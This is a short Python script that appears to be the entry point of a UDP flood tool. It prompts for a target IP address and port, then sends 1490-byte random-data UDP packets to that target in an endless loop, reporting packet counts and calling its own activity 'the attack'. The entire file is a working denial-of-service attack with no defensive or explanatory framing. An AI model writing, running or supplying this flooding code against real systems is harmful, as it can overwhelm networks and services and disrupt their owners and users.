import sys
import os
import socket
import random
from src import banner, clean

if __name__ == "__main__":
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)

        clean.clear()

        ip = input("IP Target => ")
        port = int(input("Port      => "))

        clean.clear()
        banner.banner()

        sent = 0
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             if(sent % 5000 == 0):
                 print(str(sent) + " sockets sent")
    except KeyboardInterrupt:
        print("\nArresting the attack...")
        sock.close()
        sys.exit()

